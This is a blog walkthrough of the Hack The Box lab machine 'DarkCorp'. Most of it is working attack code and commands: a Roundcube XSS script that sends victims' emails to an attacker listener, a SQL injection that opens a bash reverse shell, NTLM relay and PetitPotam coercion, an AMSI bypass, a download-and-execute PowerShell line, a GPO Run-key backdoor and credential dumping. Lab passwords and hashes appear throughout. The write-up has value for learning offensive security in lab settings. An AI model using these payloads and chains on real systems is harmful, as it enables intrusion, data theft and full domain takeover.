---
title: DarkCorp — HTB
author: Radeel Ahmad
pubDatetime: 2025-07-28T16:48:00Z
tags:
  - hacking
  - HTB
  - Roundcube
  - CVE-2024-42008
  - Active Directory
  - Kerberos
description:
  Hack The Box "DarkCorp" walkthrough — Roundcube CVE-2024-42008 XSS to exfiltrate emails, PostgreSQL SQLi to RCE, pivoting through Active Directory via NTLM relay, PetitPotam, AD CS pass-the-cert, and a GPO abuse chain to Domain Admin.
---

### DarkCorp — HTB

In this article, I will provide a step-by-step guide to solve the Hack The Box machine '**DarkCorp**'.

![](/blog/images/htb/1*dnunUADawDkO_8hUDLQMrw.png)

Although it is supposed to be a `Windows` machine, the scan looks very much like `Linux`.

```
┌──(kali㉿kali)-[~/Desktop/HTB/DarkCorp]
└─$ nmap -sV -sC -A 10.10.11.54
Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-28 16:48 UTC
Nmap scan report for 10.10.11.54
Host is up (0.27s latency).
Not shown: 998 filtered tcp ports (no-response)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u3 (protocol 2.0)
| ssh-hostkey:
|   256 33:41:ed:0a:a5:1a:86:d0:cc:2a:a6:2b:8d:8d:b2:ad (ECDSA)
|_  256 04:ad:7e:ba:11:0e:e0:fb:d0:80:d3:24:c2:3e:2c:c5 (ED25519)
80/tcp open  http    nginx 1.22.1
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: nginx/1.22.1
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 2022 (88%)
OS CPE: cpe:/o:microsoft:windows_server_2022
Aggressive OS guesses: Microsoft Windows Server 2022 (88%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

```
TRACEROUTE (using port 80/tcp)
HOP RTT       ADDRESS
1   279.13 ms 10.10.14.1
2   279.41 ms 10.10.11.54

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 49.53 seconds
```

Now update `/etc/hosts`:

```
10.10.11.54 drip.htb
```

We register a new user.

![](/blog/images/htb/1*XPuwlFMsAXkxEVmtfkq8ng.png)

- Sign up with the username `test` and password `test`.
- After logging in, we discover a new subdomain: `mail.drip.htb`.
- Now update `/etc/hosts`
- Upon accessing it and logging in, we examine the mail headers.

![](/blog/images/htb/1*ssCQLpFQEJWUkAzLZG-eBQ.png)

Now update `/etc/hosts`:

```
10.10.11.54 drip.darkcorp.htb
```

Clicking on "**About**" reveals that the webmail client is Roundcube Webmail version 1.6.7.

![](/blog/images/htb/1*csdYo_7wjpxj1CHfmCnskw.png)

Go to http://drip.htb/index#contact

Fill out the `Contact Us`.

![](/blog/images/htb/1*KfpwpVxVaynRWru_jBa7nQ.png)

Intercept the request using Burp Suite.

![](/blog/images/htb/1*CV9JETJw4dhqvt-Ug5Sllg.png)

We now change the mail recipient to our `own` email.

```
name=test&email=test%40drip.htb&message=hello&content=text&recipient=test%40drip.htb
```

Then forward the request, and we can see a new email in our inbox.

![](/blog/images/htb/1*O6HpsuWCcZ-1fgw49RlKvw.png)

Roundcube Webmail 1.6.7 is vulnerable to **CVE-2024–42008**.

### CVE-2024–42008

> A Cross-Site Scripting vulnerability in rcmail_action_mail_get->run() in Roundcube through 1.5.7 and 1.6.x through 1.6.7 allows a remote attacker to steal and send emails of a victim via a malicious e-mail attachment served with a dangerous Content-Type header.

Using a Python script that allows us to read the email from `bcase@drip.htb` or forward it to us.

Need to obtain fresh Cookies from http://drip.htb and insert them under the Cookie session.

Enter the message number we want to read (we'll use 1–3).

Make sure to enter our IP in this line:

`&_mbox=INBOX&_extwin=1\').then(r=>r.text()).then(t=>fetch(\`http://10.10.14.140:7777/c=${btoa(t)}\`)) foo=bar">Foo</body>'`

#### Python Script:

```
import requests
from http.server import BaseHTTPRequestHandler, HTTPServer
import base64
import threading
from lxml import html
# Configuration
TARGET_URL = 'http://drip.htb/contact'
LISTEN_PORT = 7777
LISTEN_IP = '0.0.0.0'
# Payload for the POST request
start_mesg = '<body title="bgcolor=foo" name="bar style=animation-name:progress-bar-stripes onanimationstart=fetch(\'/?_task=mail&_action=show&_uid='
message = 1
end_mesg = '&_mbox=INBOX&_extwin=1\').then(r=>r.text()).then(t=>fetch(`http://10.10.14.140:7777/c=${btoa(t)}`)) foo=bar">Foo</body>'
post_data = {
    'name': 'miao',
    'email': 'miao',
    'message': f"{start_mesg}{message}{end_mesg}",
    'content': 'html',
    'recipient': 'bcase@drip.htb'
}
print(f"{start_mesg}{message}{end_mesg}")
# Headers for the POST request
headers = {
    'Host': 'drip.htb',
    'Cache-Control': 'max-age=0',
    'Upgrade-Insecure-Requests': '1',
    'Origin': 'http://drip.htb',
    'Content-Type': 'application/x-www-form-urlencoded',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.6312.122 Safari/537.36',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'Referer': 'http://drip.htb/index',
    'Accept-Encoding': 'gzip, deflate, br',
    'Accept-Language': 'en-US,en;q=0.9',
    'Cookie': 'session=eyJfZnJlc2giOmZhbHNlLCJjc3JmX3Rva2VuIjoiOTU1YmRjNjk4NGUyMzA3NDJjNTk1ZDYwY2JkOTI5NTUyZjMyMjY1OSJ9.aIerQQ.tjrWpI9sqPPXYcywZ205TINzlIw',
    'Connection': 'close'
}
# Function to send the POST request
def send_post():
    response = requests.post(TARGET_URL, data=post_data, headers=headers)
    print(f"[+] POST Request Sent! Status Code: {response.status_code}")
# Custom HTTP request handler to capture and decode the incoming data
class RequestHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        if '/c=' in self.path:
            encoded_data = self.path.split('/c=')[1]
            decoded_data = base64.b64decode(encoded_data).decode('latin-1')
            tree = html.fromstring(decoded_data)
            message_body = tree.xpath('//div[@id="messagebody"]')
            if message_body:
                message_text = message_body[0].text_content().strip()
                print("[+] Extracted Message Body Content:\n")
                print(message_text)
            else:
                print("[!] No div with id 'messagebody' found.")
        else:
            print("[!] Received request but no data found.")
        self.send_response(200)
        self.end_headers()
        self.wfile.write(b'OK')
    def log_message(self, format, *args):
        return  # Suppress default logging
# Function to start the HTTP server
def start_server():
    server_address = (LISTEN_IP, LISTEN_PORT)
    httpd = HTTPServer(server_address, RequestHandler)
    print(f"[+] Listening on port {LISTEN_PORT} for exfiltrated data...")
    httpd.serve_forever()
# Run the HTTP server in a separate thread
server_thread = threading.Thread(target=start_server)
server_thread.daemon = True
server_thread.start()
# Send the POST request
send_post()
# Keep the main thread alive to continue listening
try:
    while True:
        pass
except KeyboardInterrupt:
    print("\n[+] Stopping server.")
```

Start with `message=1`

```
┌──(kali㉿kali)-[~/Desktop/HTB/DarkCorp]
└─$ python CVE-2024-42008.py
<body title="bgcolor=foo" name="bar style=animation-name:progress-bar-stripes onanimationstart=fetch('/?_task=mail&_action=show&_uid=1&_mbox=INBOX&_extwin=1').then(r=>r.text()).then(t=>fetch(`http://10.10.14.140:7777/c=${btoa(t)}`)) foo=bar">Foo</body>
[+] Listening on port 7777 for exfiltrated data...
[+] POST Request Sent! Status Code: 200
[+] Extracted Message Body Content:
```

```
Hi bcase,

Welcome to DripMail! We're excited to provide you with convenient email solutions! If you need help, please reach out to us at support@drip.htb.
```

Then with `message=2`

Reset our password to http://dev-a3f1-01.drip.htb before logging in

```
┌──(kali㉿kali)-[~/Desktop/HTB/DarkCorp]
└─$ python CVE-2024-42008.py
<body title="bgcolor=foo" name="bar style=animation-name:progress-bar-stripes onanimationstart=fetch('/?_task=mail&_action=show&_uid=2&_mbox=INBOX&_extwin=1').then(r=>r.text()).then(t=>fetch(`http://10.10.14.140:7777/c=${btoa(t)}`)) foo=bar">Foo</body>
[+] Listening on port 7777 for exfiltrated data...
[+] POST Request Sent! Status Code: 200
[+] Extracted Message Body Content:
```

```
Hey Bryce,
The Analytics dashboard is now live. While it's still in development and limited in functionality, it should provide a good starting point for gathering metadata on the users currently using our service.
You can access the dashboard at dev-a3f1-01.drip.htb. Please note that you'll need to reset your password before logging in.
If you encounter any issues or have feedback, let me know so I can address them promptly.
Thanks
```

We find the subdomain: `dev-a3f1-01.drip.htb`.

Now, update the `/etc/hosts`

Then go to `dev-a3f1-01.drip.htb/forgot`

Request the reset of the Password of `bcase@drip.htb`

![](/blog/images/htb/1*njfsp0HNnk3fJH-AM-3Szw.png)

![](/blog/images/htb/1*sYBSrD-XSnOqEgg4UUkdUA.png)

Then with `message=3`

```
┌──(kali㉿kali)-[~/Desktop/HTB/DarkCorp]
└─$ python CVE-2024-42008.py
<body title="bgcolor=foo" name="bar style=animation-name:progress-bar-stripes onanimationstart=fetch('/?_task=mail&_action=show&_uid=3&_mbox=INBOX&_extwin=1').then(r=>r.text()).then(t=>fetch(`http://10.10.14.140:7777/c=${btoa(t)}`)) foo=bar">Foo</body>
[+] Listening on port 7777 for exfiltrated data...
[+] POST Request Sent! Status Code: 200
[+] Extracted Message Body Content:
```

```
Your reset token has generated.  Please reset your password within the next 5 minutes.

You may reset your password here: http://dev-a3f1-01.drip.htb/reset/ImJjYXNlQGRyaXAuaHRiIg.aIe8Lw.ssV5uoiK5IBH_r2ctvGxR93BN0A
```

We find out that we can reset at:

`http://dev-a3f1-01.drip.htb/reset/ImJjYXNlQGRyaXAuaHRiIg.aIe8Lw.ssV5uoiK5IBH_r2ctvGxR93BN0A`

Reset the password for `bcase@drip.htb`

![](/blog/images/htb/1*e8_z9qEydT65421mX4hW1g.png)

Now we log in with the password we just set

![](/blog/images/htb/1*ZGD7cagIHeQ14u86xXDsmw.png)

After logging in, In the SEARCH field, we have an SQLi vulnerability.

```
''; SELECT pg_read_file('/etc/passwd', 0, 1000);
```

Access the /etc/passwd file.

![](/blog/images/htb/1*-eefxYRgMQ6zNpmK_dwVmQ.png)

Enter the following command in the search field to spawn a reverse shell:

```
''; DO $$
DECLARE
    c text;
BEGIN
    c := CHR(67) || CHR(79) || CHR(80) || CHR(89) || ' (SELECT '''') to program ''bash -c "bash -i >& /dev/tcp/10.10.14.140/4444 0>&1"''';
    EXECUTE c;
END $$;
--
```

After gaining a reverse shell, we check the IP

```
postgres@drip:/var/lib/postgresql/15/main$whoami
postgres
postgres@drip:/var/lib/postgresql/15/main$ip a
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc mq state UP group default qlen 1000
    link/ether 00:15:5d:84:03:02 brd ff:ff:ff:ff:ff:ff
    inet 172.16.20.3/24 brd 172.16.20.255 scope global eth0
       valid_lft forever preferred_lft forever
```

Navigate to `/var/www/html/dashboard` and open the `.env` file.

```
postgres@drip:/var/www/html/dashboard$cat .env
# True for development, False for production
DEBUG=False
```

```
# Flask ENV
FLASK_APP=run.py
FLASK_ENV=development
ASSETS_ROOT=/static/assets
DB_ENGINE=postgresql
DB_HOST=localhost
DB_NAME=dripmail
DB_USERNAME=dripmail_dba
DB_PASS=2Qa2SsBkQvsc
DB_PORT=5432
SQLALCHEMY_DATABASE_URI = 'postgresql://dripmail_dba:2Qa2SsBkQvsc@localhost/dripmail'
SQLALCHEMY_TRACK_MODIFICATIONS = True
SECRET_KEY = 'GCqtvsJtexx5B7xHNVxVj0y2X0m10jq'
MAIL_SERVER = 'drip.htb'
MAIL_PORT = 25
MAIL_USE_TLS = False
MAIL_USE_SSL = False
MAIL_USERNAME = None
MAIL_PASSWORD = None
MAIL_DEFAULT_SENDER = 'support@drip.htb'
```

Data Base Password: `2Qa2SsBkQvsc`

Start a Bash shell and discard all output.

Change into the `postgres` directory.

```
script /dev/null -c bash
cd /var/backups/postgres
```

Decrypt the file with `GPG` and save it as `dev-dripmail.old.sql`.

```
gpg --use-agent --homedir /var/lib/postgresql/.gnupg --pinentry-mode=loopback --passphrase 2Qa2SsBkQvsc --decrypt /var/backups/postgres/dev-dripmail.old.sql.gpg > dev-dripmail.old.sql
```

Then use the `cat` command to read the file `dev-dripmail.old.sql`, where we find a password hash.

```
COPY public."Admins" (id, username, password, email) FROM stdin;
1   bcase       dc5484871bc95c4eab58032884be7225    bcase@drip.htb
2   victor.r    cac1c7b0e7008d67b6db40c03e76b9c0    victor.r@drip.htb
3   ebelford    8bbd7f88841b4223ae63c8848969be86    ebelford@drip.htb
```

Crack the hash by CrackStation

![](/blog/images/htb/1*E6lKRs2tmEKJm34xM4Kodg.png)

- victor.r: `victor1gustavo@#`
- ebelford: `ThePlague61780`

Access the SSH account of user `ebelford`.

Download the nmap on your local machine from this link, then, upload it to the target machine.

```
scp nmap ebelford@10.10.11.54:/tmp/nmap
```

```
ebelford@drip:/tmp$./nmap -sn 172.16.20.0/24
```

```
Starting Nmap 6.49BETA1 ( http://nmap.org ) at 2025-07-29 04:25 MDT
Cannot find nmap-payloads. UDP payloads are disabled.
Nmap scan report for DC-01 (172.16.20.1)
Host is up (0.0014s latency).
Nmap scan report for 172.16.20.2
Host is up (0.0030s latency).
Nmap scan report for drip.darkcorp.htb (172.16.20.3)
Host is up (0.00029s latency).
Nmap done: 256 IP addresses (3 hosts up) scanned in 3.01 seconds
```

- 172.16.20.2 **WEB-01.darkcorp.htb**
- 172.16.20.1 **DC-01.darkcorp.htb** (Domain Name)
- 172.16.20.3 **drip.darkcorp.htb** (Drip Mail)

Now scan to find open ports on each host:

```
./nmap -p1-10000 172.16.20.1 172.16.20.2 172.16.20.3
```

```
ebelford@drip:/tmp$./nmap -p1-10000 172.16.20.1 172.16.20.2 172.16.20.3
```

```
Starting Nmap 6.49BETA1 ( http://nmap.org ) at 2025-07-29 04:36 MDT
Unable to find nmap-services!  Resorting to /etc/services
Cannot find nmap-payloads. UDP payloads are disabled.
Nmap scan report for DC-01 (172.16.20.1)
Host is up (0.0018s latency).
Not shown: 9983 filtered ports
PORT     STATE SERVICE
22/tcp   open  ssh
53/tcp   open  domain
80/tcp   open  http
88/tcp   open  kerberos
135/tcp  open  epmap
139/tcp  open  netbios-ssn
389/tcp  open  ldap
443/tcp  open  https
445/tcp  open  microsoft-ds
464/tcp  open  kpasswd
593/tcp  open  unknown
636/tcp  open  ldaps
2179/tcp open  unknown
3268/tcp open  unknown
3269/tcp open  unknown
5985/tcp open  unknown
9389/tcp open  unknown
```

```
Nmap scan report for 172.16.20.2
Host is up (0.00041s latency).
Not shown: 9994 closed ports
PORT     STATE SERVICE
80/tcp   open  http
135/tcp  open  epmap
139/tcp  open  netbios-ssn
445/tcp  open  microsoft-ds
5000/tcp open  unknown
5985/tcp open  unknown
```

```
Nmap scan report for drip.darkcorp.htb (172.16.20.3)
Host is up (0.00016s latency).
Not shown: 9998 closed ports
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 3 IP addresses (3 hosts up) scanned in 87.20 seconds
```

Now update `/etc/hosts`:

```
172.16.20.2 WEB-01 WEB-01.darkcorp.htb
172.16.20.1 DC-01 DC-01.darkcorp.htb darkcorp.htb
172.16.20.3 drip.darkcorp.htb
```

In our scan, we found a host: `172.16.20.2`.

We observed that two ports are open and potentially interesting: Port 80 and Port 5000.

Now, we use Ligolo for pivoting. You can find it on GitHub.

```
http://172.16.20.2:5000/
```

- Username: `victor.r`
- Password: `victor1gustavo@#`

![](/blog/images/htb/1*XkKDyXkj2ojJSeUg4Dr8vQ.png)

Download **Chisel** on your local machine (Kali).

```
wget https://github.com/jpillora/chisel/releases/download/v1.8.1/chisel_1.8.1_linux_amd64.gz
gunzip chisel_1.8.1_linux_amd64.gz
mv chisel_1.8.1_linux_amd64 chisel
chmod +x chisel
```

Now, start a Python HTTP server on your local machine and upload the Chisel binary to the target machine.

Then, run the following command on your local machine:

```
./chisel server -port 7777 --reverse
```

Run the following command on target machine:

```
./chisel client -v 10.10.14.140:7777 8080:0.0.0.0:80
```

Use `impacket-ntlmrelayx` to forward `NTLM` authentication and create a `DNS` entry in Active Directory

```
impacket-ntlmrelayx -t ldap://172.16.20.1 --add-dns-record dc-011UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYBAAAA 10.10.14.140
```

After running the command, go to http://172.16.20.2:5000/check.

Select `drip.darkcorp.htb` and port `8080`, then click on "Check".

![](/blog/images/htb/1*2d8y9QwT5-KVJH24goCMpw.png)

- Receive this output in `impacket-ntlmrelayx`
- The `DNS` entry has been created
- Close `impacket-ntlmrelayx` afterwards

![](/blog/images/htb/1*ujVAsjxuixt6Fw_Ao9Kz6w.png)

Forward Kerberos tickets with `krbrelayx.py` to request a machine certificate for `WEB-01$` via a vulnerable AD CS web interface (certsrv).

```
krbrelayx.py -t 'https://dc-01.darkcorp.htb/certsrv/certfnsh.asp' --adcs --template Machine -v 'WEB-01$' -dc-ip 172.16.20.1
```

Use `PetitPotam.py` to get the `DC (172.16.20.2)` to contact us (dc-011UWhRCA..…) using NTLM authentication

```
PetitPotam.py -u victor.r -p 'victor1gustavo@#' -d darkcorp.htb 'dc-011UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYBAAAA' 172.16.20.2
```

> You may need to restart chisel and shuttle, or add the DNS entry again. If the error message AttributeError: module 'OpenSSL.crypto' has no attribute 'PKCS12' appears, please upgrade the package.

After running the command, go to http://172.16.20.2:5000/check. Then click on "Check".

After the certificate is successfully created.

Use Certipy with the `.pfx` file of `WEB-01$` to authenticate against the domain controller (`172.16.20.1`) without a password. This technique is known as a **pass-the-cert attack**.

```
certipy-ad auth -pfx ./WEB-01\$.pfx -dc-ip 172.16.20.1 -ns 172.16.20.1
```

Use `impacket-getST` to obtain a service ticket (TGS) for CIFS (SMB) on `web-01.darkcorp.htb` using the machine account `WEB01$`. By leveraging S4U2Self and S4U2Proxy, we impersonate the Administrator account and obtain a ticket that allows us to access SMB or other services as that user.

```
impacket-getST -self 'DARKCORP.HTB/WEB-01$' -altservice 'cifs/web-01.darkcorp.htb' -dc-ip 172.16.20.1 -impersonate 'administrator' -hashes 'aad3b435b51404eeaad3b435b51404ee:8f33c7fc7ff515c1f358e488fbb8b675'
```

![](/blog/images/htb/1*5cxWSHzZeUDJeQu6W1gB4g.png)

Set the environment variable `KRB5CCNAME` to store the `Kerberos cache for administrator` access to **cifs_web01.darkcorp.htb**.

```
export KRB5CCNAME=./administrator@cifs_web-01.darkcorp.htb@DARKCORP.HTB.ccache
```

Use `smbexec.py` to execute remote commands as administrator on **web-01.darkcorp.htb**

```
python3 /usr/share/doc/python3-impacket/examples/smbexec.py -k darkcorp.htb/administrator@web-01.darkcorp.htb -dc-ip 172.16.20.1
```

### User Flag:

```
C:\Windows\system32>type C:\users\administrator\Desktop\user.txt
c6727d7a2d1e7*************
```

---

### Privilege Escalation

**Bloodhound**

Tunnel Into the Network

```
sudo sshpass -p 'ThePlague61780' sshuttle -r ebelford@drip.htb 172.16.20.0/24 --ssh-cmd 'ssh -o StrictHostKeyChecking=no'
```

Establishing an SSH connection with dynamic port forwarding with user `ebelford`

```
sshpass -p'ThePlague61780' ssh -o StrictHostKeyChecking=no -D 1080 ebelford@drip.htb
```

Add `socks5` proxy

```
nano /etc/proxychains4.conf
```

![](/blog/images/htb/1*JGKMGXrYtjs0O9AL1PX3jQ.png)

Use **proxychains4** to route **bloodhound-python** through a proxy. We authenticate as **victor.r@darkcorp.htb** using the password **victor1gustavo@#** on the domain controller **dc-01.darkcorp.htb**.

```
proxychains4 bloodhound-python -u victor.r@darkcorp.htb -p 'victor1gustavo@#' -dc dc-01.darkcorp.htb -ns 172.16.20.1 --dns-timeout 10 -c ALL -d darkcorp.htb --zip
```

See that `taylor.b.adm` is a member of the `gpo_manager` group, which has permission to modify the `SecurityUpdates` policy.

![](/blog/images/htb/1*pRbOe151Ol-_yuX6QF_j4w.png)

First, establish a tunnel.

```
sshuttle -r ebelford:'ThePlague61780'@drip.htb -N 172.16.20.0/24
```

Use `rpcclient` to gather **domain information**.

```
rpcclient -U 'victor.r%victor1gustavo@#' 172.16.20.1
```

It shows us information about password length.

```
getdompwinfo
```

The **password** must be at least `7 characters` long.

![](/blog/images/htb/1*khNqRNxItpVk8MEIbaxIjg.png)

Upload kerbrute to drip.htb

```
sshpass -p'ThePlague61780' scp kerbrute ebelford@drip.htb:/home/ebelford
```

Upload a **RockYou** file that contains passwords with a length of **7 characters**.

```
sshpass -p'ThePlague61780' scp rockyou_processed.txt ebelford@drip.htb:/home/ebelford
```

Log in via SSH to `drip.htb`.

```
ssh ebelford@drip.htb
```

Give **Kerbrute** executable permissions, then start **Kerbrute** using **rockyou_processed.txt**. (Note: this process may take around 20 minutes.)

```
time ./kerbrute bruteuser -d darkcorp.htb --dc 172.16.20.1 rockyou_processed.txt taylor.b.adm
```

![](/blog/images/htb/1*U-d4DQ54c9BkSNlQK06zsA.png)

taylor.b.adm: `!QAZzaq1`

#### PowerGPOAbuse.ps1

> Now, we can add this user as an Administrator by exploiting Group Policies, but we still need to bypass the antivirus.

Download `PowerGPOAbuse.ps1` to the local machine.

```
wget https://raw.githubusercontent.com/rootSySdk/PowerGPOAbuse/refs/heads/master/PowerGPOAbuse.ps1
```

Host the `.ps1` script locally on Kali. You can use a simple HTTP server to serve the script:

```
python3 -m http.server 80
```

#### User taylor.b.adm add to Admin Group

First, establish a tunnel to `172.16.20.0/24`

```
sshuttle -r ebelford:'ThePlague61780'@drip.htb -N 172.16.20.0/24
```

Log in with the found password

```
evil-winrm -u taylor.b.adm -p '!QAZzaq1' -i dc-01.darkcorp.htb
```

AMSI bypass

```
$a = [Ref].Assembly.GetTypes() | Where-Object { $_.Name -like '*siUtils' }; $b = $a.GetFields('NonPublic,Static') | Where-Object { $_.Name -like '*siContext' }; [IntPtr]$c = $b.GetValue($null); [Int32[]]$d = @(0); [System.Runtime.InteropServices.Marshal]::Copy($d, 0, $c, 1)
```

Download Script

```
iex (New-Object Net.WebClient).DownloadString('http://10.10.14.140:80/PowerGPOAbuse.ps1')
```

Add the user `taylor.b.adm` to a specific group using a Group Policy (`GPOIdentity 'SecurityUpdates'`)

```
Add-GPOGroupMember -Member 'taylor.b.adm' -GPOIdentity 'SecurityUpdates'
```

Set a new **Registry value** in the **Windows Registry** to ensure that a PowerShell command is executed at every system **startup**.

> This will automatically add the user taylor.b.adm to the Administrators group by executing the command each time the system starts.

```
Set-GPRegistryValue -Name "SecurityUpdates" -Key "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" -ValueName "backdoor" -Type String -Value "powershell -ExecutionPolicy Bypass -NoProfile -Command `"Add-LocalGroupMember -Group 'Administrators' -Member taylor.b.adm`""
```

Force an immediate update of the `Group Policies` by running the following command:

```
gpupdate /force
```

![](/blog/images/htb/1*agGAZUKSWlgczPdFWsYkXA.png)

Hash `dump`

```
secretsdump.py darkcorp/taylor.b.adm:'!QAZzaq1'@darkcorp.htb
```

![](/blog/images/htb/1*vkp9B_ag5ujveLbkXv7YYA.png)

Connect as **Administrator** and retrieve the `root.txt` flag.

```
evil-winrm -i dc-01.darkcorp.htb -u "administrator" -H "fcb3ca5a19a1ccf2d14c13e8b64cde0f"
```

```
┌──(kali㉿kali)-[~/Desktop/HTB/DarkCorp]
└─$ evil-winrm -i dc-01.darkcorp.htb -u "administrator" -H "fcb3ca5a19a1ccf2d14c13e8b64cde0f"

Evil-WinRM shell v3.7

Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline

Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents> type ../Desktop/root.txt
5356781652185a896*************
```

---

**Thank You** for reading this article. I hope that you have found this information provided to be valuable and helpful. Use it for educational purposes only…. 🙂

**RADEEL AHMAD**
